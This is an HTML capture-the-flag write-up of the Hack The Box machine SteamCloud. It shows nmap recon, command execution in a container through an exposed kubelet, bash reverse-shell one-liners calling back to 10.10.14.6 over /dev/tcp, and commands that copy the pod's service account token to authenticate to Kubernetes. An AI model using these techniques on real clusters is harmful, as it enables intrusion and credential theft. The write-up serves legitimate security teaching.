@@ -1,0 +1,573 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: SteamCloud</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-steamcloud">htb-steamcloud</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#uni-ctf">uni-ctf</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#kubernetes">kubernetes</a> <a class="post-tag" href="/tags#minikube">minikube</a> <a class="post-tag" href="/tags#htb-unobtainium">htb-unobtainium</a> <a class="post-tag" href="/tags#kubectl">kubectl</a> <a class="post-tag" href="/tags#kubeletctl">kubeletctl</a> <a class="post-tag" href="/tags#container">container</a> </span><br/><br/>
+<time class="dt-published" datetime="2022-02-14T10:00:00+00:00" itemprop="datePublished">Feb 14, 2022
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2022/02/14/htb-steamcloud.html" style="color: #e6e6e6; text-decoration: none;">HTB: SteamCloud</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/steamcloud-cover.webp" type="image/webp"/>
+<img alt="SteamCloud" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/steamcloud-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>SteamCloud just presents a bunch of Kubernetes-related ports. Without a way to authenticate, I can’t do anything with the Kubernetes API. But I also have access to the Kubelet running on one of the nodes (which is the same host), and that gives access to the pods running on that node. I’ll get into one and get out the keys necessary to auth to the Kubernetes API. From there, I can spawn a new pod, mounting the host file system into it, and get full access to the host. I’ll eventually manage to turn that access into a shell as well.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/443 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/steamcloud" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">SteamCloud</a> <a href="https://hackthebox.com/machines/steamcloud" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-steamcloud.webp" type="image/webp"/> <img alt="SteamCloud" class="img-av" src="/icons/box-steamcloud.png"/></picture></a><br/><a href="https://hackthebox.com/machines/steamcloud" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1493533056552116227">14 Feb 2022</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">14 Feb 2022</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/27390" rel="noopener" target="_blank"><img alt="felamos" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/27390" style="display: unset"/><span class="user-text" style="display: none"> felamos</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found seven open TCP ports, SSH (22), Kubernetes (2379, 2380, and 8443), and InfluxDB (10249, 10250, and 10256):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.133
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-13 15:22 EST
+Nmap scan report for 10.10.11.133
+Host is up (0.098s latency).
+Not shown: 65528 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+2379/tcp  open  etcd-client
+2380/tcp  open  etcd-server
+8443/tcp  open  https-alt
+10249/tcp open  unknown
+10250/tcp open  unknown
+10256/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,2379,2380,8443,10249,10250,10256 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.133
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-13 15:25 EST
+Nmap scan report for 10.10.11.133
+Host is up (0.092s latency).
+
+PORT      STATE SERVICE          VERSION
+22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
+|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
+|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
+2379/tcp  open  ssl/etcd-client?
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  h2
+2380/tcp  open  ssl/etcd-server?
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  h2
+8443/tcp  open  ssl/https-alt
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 403 Forbidden
+...[snip]...
+|_http-title: Site doesn't have a title (application/json).
+| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
+| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+| Not valid before: 2022-02-12T20:29:38
+|_Not valid after:  2025-02-12T20:29:38
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+| ssl-cert: Subject: commonName=steamcloud@1644784186
+| Subject Alternative Name: DNS:steamcloud
+| Not valid before: 2022-02-13T19:29:45
+|_Not valid after:  2023-02-13T19:29:45
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=2/13%Time=62096946%P=x86_64-pc-linux-gn
+SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20a98ba
+...[snip]...
+SF::{},\"code\":403}\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 226.40 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.debian.org/search?keywords=openssh-server">OpenSSH</a> versions, the host is likely running Debian 10 buster.</p>
+<p>The service on 8443 has a bunch of information about the TLS certificate, which gives a bunch of names:</p>
+<ul>
+<li>minikube/organizationName=system:masters</li>
+<li>minikubeCA</li>
+<li>control-plane.minikube.internal</li>
+<li>kubernetes.default.svc.cluster.local</li>
+<li>kubernetes.default.svc</li>
+<li>kubernetes.default</li>
+<li>kubernetes</li>
+<li>localhost</li>
+<li>10.10.11.133</li>
+<li>10.96.0.1</li>
+<li>127.0.0.1</li>
+<li>10.0.0.1</li>
+</ul>
+<p>Those all seem Kubernetes-related, and match what I saw on <a href="/2021/09/04/htb-unobtainium.html#nmap">Unobtainium</a>.</p>
+<p>Based on <a href="https://kubernetes.io/docs/reference/ports-and-protocols/">this documentation</a>, not only are 2379 and 2380 a part of Kubernetes, but the ports that <code class="language-plaintext highlighter-rouge">nmap</code> labeled as InfluxDB  are as well. Based on some of the names, this seems like an instance of <a href="https://minikube.sigs.k8s.io/docs/">minikube</a>:</p>
+<blockquote>
+<p>minikube quickly sets up a local Kubernetes cluster on macOS, Linux, and Windows. We proudly focus on helping application developers and new Kubernetes users.</p>
+</blockquote>
+<h3 id="kubernetes-overview">Kubernetes Overview</h3>
+<p>According to <a href="https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/">their docs</a>, Kubernetes is:</p>
+<blockquote>
+<p>A portable, extensible, open-source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. It has a large, rapidly growing ecosystem. Kubernetes services, support, and tools are widely available.</p>
+</blockquote>
+<p>The docs page linked above has a lot more, but the short description is that Kubernetes manages large deployments of containers.</p>
+<p><a href="https://kubernetes.io/docs/concepts/overview/components/">This page</a> goes over the main components of a Kubernetes cluster, and includes this helpful diagram:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/components-of-kubernetes.png"><img alt="Components-of-Kubernetes" src="https://0xdfimages.gitlab.io/img/components-of-kubernetes.png"/><em>Click for full size image</em></a></p>
+<p>Typically these wouldn’t all be on the same host, but in an environment like HTB, it ends up that way.</p>
+<p>So what we’re looking at on TCP 8443 is the main API server for the cluster. A kubelet is an agent running on each node that controls it, and typically listens on TCP 10250.</p>
+<h3 id="kubernetes-api---tcp-8443">Kubernetes API - TCP 8443</h3>
+<p>TCP 8443 is the default starting port for the <a href="https://minikube.sigs.k8s.io/docs/commands/start/">API server in minikube</a>. Visiting the service in Firefox returns an HTTP 403 with a JSON body:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220213164430344.webp" type="image/webp"/>
+<img alt="image-20220213164430344" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220213164430344.png"/>
+</picture>
+<p>The anonymous user can’t <code class="language-plaintext highlighter-rouge">/</code>.</p>
+<p>I can install a tool like <code class="language-plaintext highlighter-rouge">kubectl</code> (instructions <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">on kubernetes.io</a>) and try to interact, but it just prompts for auth:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl <span class="nt">--server</span> https://10.10.11.133:8443  get pod
+<span class="go">Please enter Username: ^C
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl <span class="nt">--server</span> https://10.10.11.133:8443 get namespaces
+<span class="go">Please enter Username: ^C
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl <span class="nt">--server</span> https://10.10.11.133:8443 cluster-info
+<span class="go">Please enter Username:
+</span></code></pre></div></div>
+<h3 id="kubelet-api---tcp-10250">Kubelet API - TCP 10250</h3>
+<p>The kubelet agent listens on tcp 10250, so perhaps I can interact with a specific node. Trying to visit in Firefox just returns a 404:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220213165532092.webp" type="image/webp"/>
+<img alt="image-20220213165532092" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220213165532092.png"/>
+</picture>
+<p>There’s a tool like <code class="language-plaintext highlighter-rouge">kubectl</code> for kubelets, <a href="https://github.com/cyberark/kubeletctl">kubeletctl</a>. After installing it based on the instructions from the README, I’ll try the <code class="language-plaintext highlighter-rouge">pods</code> command to list all the pods on the node. There are a bunch:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl pods <span class="nt">-s</span> 10.10.11.133
+<span class="go">┌────────────────────────────────────────────────────────────────────────────────┐
+│                                Pods from Kubelet                               │
+├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 1 │ storage-provisioner                │ kube-system │ storage-provisioner     │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 2 │ coredns-78fcd69978-7dhjv           │ kube-system │ coredns                 │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 3 │ nginx                              │ default     │ nginx                   │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 5 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 6 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 7 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 8 │ kube-proxy-562gf                   │ kube-system │ kube-proxy              │
+│   │                                    │             │                         │
+└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">runningpods</code> command gives a bunch of JSON about the running pods:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl runningpods <span class="nt">-s</span> 10.10.11.133                                                 
+<span class="go">{       
+  "kind": "PodList",
+  "apiVersion": "v1",
+  "metadata": {},                     
+  "items": [                       
+    {                                                 
+      "metadata": {                
+        "name": "kube-scheduler-steamcloud",
+...[snip]...
+        "creationTimestamp": null
+      },
+      "spec": {
+        "containers": [
+          {
+            "name": "kube-proxy",
+            "image": "sha256:6120bd723dcedd08f7545da1a8458ad4f23fbd1e94cb578519122f920a77b737",
+            "resources": {}
+          }
+        ]
+      },
+      "status": {}
+    }
+  ]
+}
+</span></code></pre></div></div>
+<p>To make it more readable, I’ll use <code class="language-plaintext highlighter-rouge">jq</code> to get a list of the name and namespace:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl runningpods <span class="nt">-s</span> 10.10.11.133 | jq <span class="nt">-c</span> <span class="s1">'.items[].metadata | [.name, .namespace]'</span>
+<span class="go">["kube-proxy-562gf","kube-system"]
+["kube-scheduler-steamcloud","kube-system"]
+["kube-controller-manager-steamcloud","kube-system"]
+["kube-apiserver-steamcloud","kube-system"]
+["etcd-steamcloud","kube-system"]
+["nginx","default"]
+["coredns-78fcd69978-7dhjv","kube-system"]
+["storage-provisioner","kube-system"]
+</span></code></pre></div></div>
+<p>There’s only one that’s not in the <code class="language-plaintext highlighter-rouge">kube-system</code> namespace.</p>
+<h2 id="shell-as-root-in-nginx">Shell as root in nginx</h2>
+<h3 id="exec">exec</h3>
+<p>With access to the kubelet service, I can also run commands on the containers. I’ll use the <code class="language-plaintext highlighter-rouge">exec</code> command in <code class="language-plaintext highlighter-rouge">kubeletctl</code>, giving both the name of the pod (nginx) and the name of the container (nginx):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"id"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>As root, I can read the <code class="language-plaintext highlighter-rouge">user.txt</code> in the <code class="language-plaintext highlighter-rouge">/root</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"ls /root"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">user.txt
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"cat /root/user.txt"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">e73f21f6************************
+</span></code></pre></div></div>
+<h3 id="rev-fails">Rev Fails</h3>
+<p>I tried a handful of things to get the container to connect back to me. It does have <code class="language-plaintext highlighter-rouge">bash</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"which bash"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">/bin/bash
+</span></code></pre></div></div>
+<p>But it won’t do a <code class="language-plaintext highlighter-rouge">bash</code> reverse shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">-i: -c: line 0: unexpected EOF while looking for matching `''
+-i: -c: line 1: syntax error: unexpected end of file
+command terminated with exit code 1
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"'</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">-i: -c: line 0: unexpected EOF while looking for matching `"'
+-i: -c: line 1: syntax error: unexpected end of file
+command terminated with exit code 1
+</span></code></pre></div></div>
+<p>Thinking it might be bad characters, I tried encoded the reverse shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"</span> | <span class="nb">base64</span> <span class="nt">-w0</span>
+<span class="go">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s1">'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==" | base64 -d | bash'</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">"YmFzaCAtaSA JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==" | base64 -d | bash
+</span></code></pre></div></div>
+<p>It doesn’t seem to handle the pipes well.</p>
+<p>Neither <code class="language-plaintext highlighter-rouge">curl</code> nor <code class="language-plaintext highlighter-rouge">wget</code> seem to be in the container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"curl 10.10.14.6"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="gp">OCI runtime exec failed: exec failed: container_linux.go:344: starting container process caused "exec: \"curl\": executable file not found in $</span>PATH<span class="s2">": unknown
+</span><span class="go">command terminated with exit code 126
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"wget 10.10.14.6"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="gp">OCI runtime exec failed: exec failed: container_linux.go:344: starting container process caused "exec: \"wget\": executable file not found in $</span>PATH<span class="s2">": unknown
+</span><span class="go">command terminated with exit code 126
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">nc</code>, <code class="language-plaintext highlighter-rouge">python</code>, and <code class="language-plaintext highlighter-rouge">python3</code> aren’t either.</p>
+<h3 id="shell">Shell</h3>
+<p><em>Update 15 Sept 2022: Big thanks to GhostNinja who pointed this out to me.</em></p>
+<p>It turns out there’s a much simpler way to get a shell - just issue the <code class="language-plaintext highlighter-rouge">bash</code> (or <code class="language-plaintext highlighter-rouge">sh</code>) command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"/bin/bash"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">root@nginx:/# id
+uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>This command is listed on the <a href="https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside?q=kubeletctr#kubelet-rce">HackTricks page for Kubernetes</a>. As I failed to get a shell when initially solving the box, the rest of the writeup is operating without this.</p>
+<h2 id="file-system-as-root-on-steamcloud">File System as root on SteamCloud</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="nginx-container">nginx Container</h4>
+<p><a href="https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/enumeration-from-a-pod">This page</a> from HackTricks shows the location of the ServiceAccount object, which is managed by Kubernetes and provides identity within the pod. It gives three typical directories:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">/run/secrets/kubernetes.io/serviceaccount</code></li>
+<li><code class="language-plaintext highlighter-rouge">/var/run/secrets/kubernetes.io/serviceaccount</code></li>
+<li><code class="language-plaintext highlighter-rouge">/secrets/kubernetes.io/serviceaccout</code></li>
+</ul>
+<p>In this case, it’s the first one:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"ls /run/secrets/kubernetes.io/serviceaccount"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx
+<span class="go">ca.crt  namespace  token
+</span></code></pre></div></div>
+<p>These are the three <a href="https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/enumeration-from-a-pod">expected files</a>:</p>
+<blockquote>
+<p><strong>ca.crt</strong>: It’s the ca certificate to check kubernetes communications</p>
+<p><strong>namespace</strong>: It indicates the current namespace</p>
+<p><strong>token</strong>: It contains the <strong>service token</strong> of the current pod.</p>
+</blockquote>
+<p>With the <code class="language-plaintext highlighter-rouge">ca.crt</code> and the <code class="language-plaintext highlighter-rouge">token</code>, I can authenticate to the cluster.</p>
+<p>I’ll save these (<code class="language-plaintext highlighter-rouge">tee</code> will write them to a file and show them via stdout):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"cat /run/secrets/kubernetes.io/serviceaccount/ca.crt"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx | <span class="nb">tee </span>ca.crt
+<span class="go">-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+...[snip]...
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"cat /run/secrets/kubernetes.io/serviceaccount/token"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx | <span class="nb">tee </span>token
+<span class="go">eyJhbGciOiJSUzI1NiIsImtpZCI6Im1aLUpKcmtjMFJTM3hpT083ZUNNLWk2WTRvNENTZWRvMVBZNmpaY1FmMUUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZ
+...[snip]...
+</span></code></pre></div></div>
+<h4 id="auth-to-kubernetes-api">Auth to Kubernetes API</h4>
+<p>To use <code class="language-plaintext highlighter-rouge">kubectl</code>, I’ll save the <code class="language-plaintext highlighter-rouge">token</code> in an environment variable, <code class="language-plaintext highlighter-rouge">token</code> (to save a lot of copy and pasting):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">export </span><span class="nv">token</span><span class="o">=</span><span class="si">$(</span>kubeletctl <span class="nt">-s</span> 10.10.11.133 <span class="nb">exec</span> <span class="s2">"cat /run/secrets/kubernetes.io/serviceaccount/token"</span> <span class="nt">-p</span> nginx <span class="nt">-c</span> nginx<span class="si">)</span>
+</code></pre></div></div>
+<p>Now I can pass the <code class="language-plaintext highlighter-rouge">ca.crt</code> file and the <code class="language-plaintext highlighter-rouge">token</code> to <code class="language-plaintext highlighter-rouge">kubectl</code> and it doesn’t ask for a username and password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl <span class="nt">--server</span> https://10.10.11.133:8443 <span class="nt">--certificate-authority</span><span class="o">=</span>ca.crt <span class="nt">--token</span><span class="o">=</span><span class="nv">$token</span> get pod
+<span class="go">NAME    READY   STATUS    RESTARTS   AGE
+nginx   1/1     Running   0          14h
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">get pod</code> returns information about the running pod! I</p>
+<h4 id="can-i">can-i</h4>
+<p>The current account can’t do some of the more admin-like things like get information about the namespaces or cluster:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl <span class="nt">--server</span> https://10.10.11.133:8443 <span class="nt">--certificate-authority</span><span class="o">=</span>ca.crt <span class="nt">--token</span><span class="o">=</span><span class="nv">$token</span> get namespaces
+<span class="go">Error from server (Forbidden): namespaces is forbidden: User "system:serviceaccount:default:default" cannot list resource "namespaces" in API group "" at the cluster scope
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl <span class="nt">--server</span> https://10.10.11.133:8443 <span class="nt">--certificate-authority</span><span class="o">=</span>ca.crt <span class="nt">--token</span><span class="o">=</span><span class="nv">$token</span> cluster-info
+<span class="go">
+To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
+Error from server (Forbidden): services is forbidden: User "system:serviceaccount:default:default" cannot list resource "services" in API group "" in the namespace "kube-system"
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">auth can-i</code> command in <code class="language-plaintext highlighter-rouge">kubectl</code> is used to see if a given account can take some action. With the <code class="language-plaintext highlighter-rouge">-list</code> flag, it will show all permissions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kubectl auth can-i <span class="nt">--list</span> <span class="nt">--server</span> https://10.10.11.133:8443 <span class="nt">--certificate-authority</span><span class="o">=</span>ca.crt <span class="nt">--token</span><span class="o">=</span><span class="nv">$token</span>
+<span class="go">Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+pods                                            []                                    []               [get create list]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+...[snip]...
+</span></code></pre></div></div>
+<p>The important line is the third one, which says this account can <code class="language-plaintext highlighter-rouge">get</code>, <code class="language-plaintext highlighter-rouge">create</code>, and <code class="language-plaintext highlighter-rouge">list</code> pods.</p>
+<h4 id="nginx-container-info">nginx Container Info</h4>
+<p>I’ll grab the details of the current <code class="language-plaintext highlighter-rouge">nginx</code> container:</p>
